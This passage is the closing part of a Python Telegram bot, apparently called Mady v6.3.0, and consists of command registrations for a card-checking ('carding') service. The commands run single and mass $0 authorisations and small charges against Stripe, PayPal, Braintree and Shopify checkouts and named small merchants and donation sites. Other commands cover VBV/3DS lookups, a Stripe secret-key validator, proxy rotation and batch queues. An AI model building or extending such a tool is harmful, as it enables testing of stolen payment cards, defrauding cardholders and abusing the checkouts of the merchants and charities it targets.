    application.add_handler(CommandHandler("msa4", mass_newschools_auth_command))  # /msa4 → mass Auth $0
    application.add_handler(CommandHandler("sa5", ywca_auth_command))  # /sa5 → Auth $0
    application.add_handler(CommandHandler("msa5", mass_ywca_auth_command))  # /msa5 → mass Auth $0
    
    # VBV/3DS Lookup
    application.add_handler(CommandHandler("vbv", vbv_lookup_command))  # /vbv → VBV/3DS lookup
    application.add_handler(CommandHandler("vkrm", vkrm_command))  # /vkrm → Vkrm API gate
    application.add_handler(CommandHandler("sk", sk_validate_command))  # /sk → SK validator
    application.add_handler(CommandHandler("cf", corrigan_command))  # /cf → Corrigan $0.50
    application.add_handler(CommandHandler("corrigan", corrigan_command))  # /corrigan → Corrigan $0.50
    application.add_handler(CommandHandler("mcf", mass_corrigan_command))  # /mcf → Mass Corrigan
    application.add_handler(CommandHandler("tsa", texas_command))  # /tsa → Texas $0.50
    application.add_handler(CommandHandler("texas", texas_command))  # /texas → Texas $0.50
    application.add_handler(CommandHandler("mtsa", mass_texas_command))  # /mtsa → Mass Texas
    application.add_handler(CommandHandler("pp", paypal_command))  # /pp → PayPal $5
    application.add_handler(CommandHandler("paypal", paypal_command))  # /paypal → PayPal $5
    application.add_handler(CommandHandler("mpp", mass_paypal_command))  # /mpp → Mass PayPal
    application.add_handler(CommandHandler("sn", shopify_checkout_command))  # /sn → Shopify Checkout
    application.add_handler(CommandHandler("shop", shopify_checkout_command))  # /shop → Shopify Checkout
    application.add_handler(CommandHandler("shopify", shopify_checkout_command))  # /shopify → Shopify Checkout
    application.add_handler(CommandHandler("msn", mass_shopify_checkout_command))  # /msn → Mass Shopify Checkout
    application.add_handler(CommandHandler("auto", auto_detect_command))  # /auto → Auto-detect platform
    application.add_handler(CommandHandler("ad", auto_detect_command))  # /ad → Auto-detect (short)
    application.add_handler(CommandHandler("detect", auto_detect_command))  # /detect → Auto-detect
    application.add_handler(CommandHandler("mauto", mass_auto_detect_command))  # /mauto → Mass auto-detect
    application.add_handler(CommandHandler("categorize", categorize_sites_command))  # /categorize → Categorize sites
    application.add_handler(CommandHandler("catsites", categorize_sites_command))  # /catsites → Categorize sites (short)
    
    application.add_handler(CommandHandler("ade", adespresso_auth_command))  # /ade → AdEspresso Auth $0
    application.add_handler(CommandHandler("auth", stripe_real_auth_command))  # /auth → Real $0 Auth (Stripe)
    application.add_handler(CommandHandler("sauth", stripe_real_auth_command))  # /sauth → Real $0 Auth (Stripe)
    application.add_handler(CommandHandler("realauth", stripe_real_auth_command))  # /realauth → Real $0 Auth (Stripe)
    application.add_handler(CommandHandler("mauth", mass_stripe_real_auth_command))  # /mauth → Mass Real $0 Auth (Stripe)
    application.add_handler(CommandHandler("ppauth", paypal_auth_command))  # /ppauth → PayPal $0 Auth
    application.add_handler(CommandHandler("pauth", paypal_auth_command))  # /pauth → PayPal $0 Auth
    application.add_handler(CommandHandler("mppauth", mass_paypal_auth_command))  # /mppauth → Mass PayPal Auth
    application.add_handler(CommandHandler("btc", braintree_charge_command))  # /btc → Braintree Charge
    application.add_handler(CommandHandler("b3c", braintree_charge_command))  # /b3c → Braintree Charge
    application.add_handler(CommandHandler("mbtc", mass_braintree_charge_command))  # /mbtc → Mass Braintree Charge
    application.add_handler(CommandHandler("bac", bellalliance_charge_command))  # /bac → Bell Alliance $5 CAD
    application.add_handler(CommandHandler("coa", checkoutauth_command))  # /coa → /checkoutauth
    application.add_handler(CommandHandler("bl", blemart_command))  # /bl → /blemart
    application.add_handler(CommandHandler("dp", districtpeople_command))  # /dp → /districtpeople
    application.add_handler(CommandHandler("bg", bgddesigns_command))  # /bg → /bgddesigns
    application.add_handler(CommandHandler("sv", saintvinson_givewp_command))  # /sv → /saintvinson
    application.add_handler(CommandHandler("sf", staleks_florida_command))  # /sf → /staleks
    application.add_handler(CommandHandler("nano", shopify_nano_command))  # /nano → /shopify_nano
    
    # SHORT ALIAS COMMANDS (Mass checks)
    application.add_handler(CommandHandler("m", mass_check_command))  # /m → /mass
    application.add_handler(CommandHandler("mc1", mass_charge1_command))  # /mc1 → /mass_charge1
    application.add_handler(CommandHandler("mc2", mass_charge2_command))  # /mc2 → /mass_charge2
    application.add_handler(CommandHandler("mc3", mass_charge3_command))  # /mc3 → /mass_charge3
    application.add_handler(CommandHandler("mc4", mass_charge4_command))  # /mc4 → /mass_charge4
    application.add_handler(CommandHandler("mc5", mass_charge5_command))  # /mc5 → /mass_charge5
    application.add_handler(CommandHandler("mse", mass_stripe_epicalarc_command))  # /mse → /mass_stripe_epicalarc
    application.add_handler(CommandHandler("mms", mass_madystripe_command))  # /mms → /mass_madystripe
    application.add_handler(CommandHandler("mbl", mass_blemart_command))  # /mbl → /mass_blemart
    application.add_handler(CommandHandler("mdp", mass_districtpeople_command))  # /mdp → /mass_districtpeople
    application.add_handler(CommandHandler("mbg", mass_bgddesigns_command))  # /mbg → /mass_bgddesigns
    application.add_handler(CommandHandler("msv", mass_saintvinson_givewp_command))  # /msv → /mass_saintvinson
    application.add_handler(CommandHandler("msf", mass_staleks_florida_command))  # /msf → /mass_staleks
    application.add_handler(CommandHandler("mnano", mass_shopify_nano_command))  # /mnano → /mass_shopify_nano
    
    application.add_handler(CommandHandler("stop", stop_check_command))
    application.add_handler(CommandHandler("stop1", stop_check_command))
    application.add_handler(CommandHandler("stop2", stop_check_command))
    application.add_handler(CommandHandler("stop3", stop_check_command))
    application.add_handler(CommandHandler("stop4", stop_check_command))
    application.add_handler(CommandHandler("stop5", stop_check_command))
    
    # Concurrent Batch Queue Commands
    application.add_handler(CommandHandler("queue", queue_command))
    application.add_handler(CommandHandler("q", queue_command))
    application.add_handler(CommandHandler("massall", massall_command))
    application.add_handler(CommandHandler("ma", massall_command))
    application.add_handler(CommandHandler("clearqueue", clearqueue_command))
    application.add_handler(CommandHandler("cq", clearqueue_command))
    application.add_handler(CommandHandler("stopall", stopall_command))
    application.add_handler(CommandHandler("sa", stopall_command))
    
    # Paired Check Commands (single file on two gateways simultaneously)
    application.add_handler(CommandHandler("paired_ps", paired_paypal_stripe_command))
    application.add_handler(CommandHandler("paired_bp", paired_braintree_paypal_command))
    application.add_handler(CommandHandler("paired_ss", paired_shopify_stripe_command))
    application.add_handler(CommandHandler("paired_bs", paired_braintree_stripe_command))
    
    # Document handler MUST come before text handler
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Text handler (with inverted COMMAND filter to avoid commands)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Register error handler
    application.add_error_handler(error_handler)
    
    print(f"{F}[*] Bot is running! Press Ctrl+C to stop.{RESET}")
    print(f"{F}[*] Error logging enabled: logs/bot_errors.log{RESET}")
    print(f"{F}[*] Runtime logging enabled: logs/bot_runtime_*.log{RESET}")
    print(f"{ORANGE}[*] Mady v6.3.0 (Heather) features active: Cache, Retry, Proxy Rotation, Analytics{RESET}")
    
    # Run the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
